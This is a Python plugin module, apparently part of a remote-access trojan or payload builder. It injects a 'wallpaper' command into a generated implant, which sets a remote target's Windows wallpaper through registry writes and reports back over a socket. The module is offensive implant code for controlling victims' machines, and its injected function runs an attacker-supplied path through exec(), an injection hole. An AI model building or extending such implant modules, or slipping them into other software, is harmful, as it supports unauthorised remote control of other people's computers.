# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from win32api import RegOpenKeyEx, RegSetValueEx')
        self.config.import_statements.append('from win32con import HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, SPI_SETDESKWALLPAPER')
        self.config.import_statements.append('from win32gui import SystemParametersInfo')
        self.config.functions.append('''
def wallpaper(data):
    path = data.split(' ',1)[1]
    exec("path = r'" + path + "'")
    key = RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\\Desktop",0,KEY_SET_VALUE)
    RegSetValueEx(key, "WallpaperStyle", 0, REG_SZ, "0")
    RegSetValueEx(key, "CenterWallpaper", 0, REG_SZ, "0")
    SystemParametersInfo(SPI_SETDESKWALLPAPER, path, 1+2)
    send_all(s,'[+]Set wallpaper to : ' + path)
''')
        self.config.logics.append('''
            elif command == "wallpaper":
                wallpaper(data)''')
        self.config.help_menu[
            'wallpaper <Remote path of picture>'] = 'Set the targets wallpaper to a specified image file on the remote system'
    elif option == 'info':
        self.log.blank('\nName             : Wallpaper Changer' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : win32api (External), win32con (External), win32gui (External)' \
                       '\nCommands         : wallpaper <Remote path of picture>' \
                       '\nDescription      : Set the targets wallpaper to a specified image file on the remote system\n')
        return {
            "Name": "Wallpaper Changer",
            "OS": "Windows",
            "Required Modules": "win32api (External), win32con (External), win32gui (External)",
            "Commands": "wallpaper <Remote path of picture>",
            "Description": "Set the targets wallpaper to a specified image file on the remote system"}
